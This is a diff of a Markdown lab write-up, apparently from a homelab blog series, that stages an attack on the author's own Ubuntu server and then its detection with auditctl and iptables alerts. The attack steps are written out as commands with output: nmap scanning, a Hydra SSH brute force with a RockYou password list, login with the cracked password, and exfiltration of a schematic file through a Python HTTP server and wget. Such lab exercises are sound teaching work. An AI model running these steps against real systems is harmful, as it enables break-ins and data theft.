@@ -1,6 +1,6 @@
 ---
 layout: default
-title: BUREAU PH:01
+title: BUREAU:01
 ---
 
 # TECH-BUREAU SERIES: PHASE 01
@@ -23,11 +23,13 @@ title: BUREAU PH:01
 
 ### The initial Setup
 The Ubuntu server is configured via auditctl to watch a specific file in directory – **PROJECT.5527**,<br>
-any interaction with the containing schematic file will raise an alert.
+any interaction with the containing schematic file will raise an alert.<br>
 <<AUTDITCTL + LOCAL RULE>>
-The server firewall iptables is also watching for any suspicious incoming trafic to the main ports to try and raise the alert in case of an outside port scan.
+The server firewall iptables is also watching for any suspicious incoming trafic to the main ports<br>
+raising the alert in case of an outside port scan.<br>
 <<IPTABLES + LOCAL RULE>>
 
+---
 # AT4K-3XPR3S rolling out.
 Without further ado. In this scenario we know the ip address of our target server and we got a username that we belive has a week password. <br>We assemble our handfull of penetraton tools and begin. 
 ## 01.Server Recognisence Using nmap
@@ -51,7 +53,6 @@ Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
 We are interested in the port status, we are going for 4 ports in this scenario. <br>
 We are looking for a bruteforce attack here. We confirm port 22 for SSH is up. <br>
 
-
 ## 02.SSH credential Hydra Attack
 <pre data-label="hydra bruteforce"><code>
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ hydra -l intern -P ROCK_YOU_10.txt ssh://TECH-BUREAU
@@ -68,14 +69,12 @@ Hydra finished at 2026-02-21 16:12:21
 </code></pre>
 Hydra is used for the SSH brute force, we use the username *intern* and a custom top 10 RockYou passwords file.</br>
 
-
 ## 03.SSH IN TO THE SERVER
 <pre data-label="SSH"><code>
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$ ssh intern@TECH-BUREAU
 intern@tech-bureau's password:<span class="orange"><strong>football</strong></span>
 </code></pre>
 We SSH under the username *intern* the destination is **TECH-BUREAU** and the password we use is *football*.
-
 
 ## 04.TARGET FILE SEARCH
 <pre data-label="find the specs"><code>
@@ -87,7 +86,6 @@ find: ‘./lead_engineer/.ssh’: Permission denied
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home$ 
 </code></pre>
 We are in, using the *find* command we search for the file Frame_specs.txt
-
 
 ## 05.CHECK DIRECTORY AND CONCATINATE
 <pre data-label="ls and cat"><code>
@@ -109,7 +107,6 @@ Result: less total weight, shorter cylinder stroke, and less wear and tear on pa
 </code></pre>
 We have changed the directory and located the coveted schematic. we use the humble *cat* command to confirm the data.
 
-
 ## 06.ESTABLISHING A PYTHON SERVER
 <pre data-label="http.server"><code>
 <span class="orange"><strong>intern@TECH-BUREAU-UBUNTU-24:</strong></span>/home/lead_engineer/PROJECT.5527$ python3 -m http.server 8000
@@ -117,7 +114,6 @@ We have changed the directory and located the coveted schematic. we use the humb
 Serving HTTP on 0.0.0.0 port <span class="orange"><strong>8000</strong></span> (http://0.0.0.0:8000/) ...
 </code></pre>
 With the file confirmed we want to snatch it for our industrial espionage purpose. A quick and dirty way is to establish a simple HTTP server using python.
-
 
 ## 07.EXFILTRATE VIA ATTACK TERMINAL
 <pre data-label="wget"><code>
@@ -142,13 +138,11 @@ logout
 Connection to tech-bureau closed.
 <span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.01$
 </code></pre>
+Primary goal achieved, data secured.<br>
 Thank You and Good Bye.
-<div class="divider-wire">
-  <span class="line"></span>
-  <span class="symbol">⦿</span>
-  <span class="line"></span>
-</div>
-# DEFENSES MOVE
+
+---
+# TECH-BUREAU ROLLING OUT
 We did a little bit of tinkering before starting this scenario, and as a result we have catered alerts just for the occasion.<br>
 The firewall is checking for tcp packets to 4 specific ports. The auditctl is monitoring a particularly sensitive file on the server.<br>
 Lets see if we were ready for an attack.
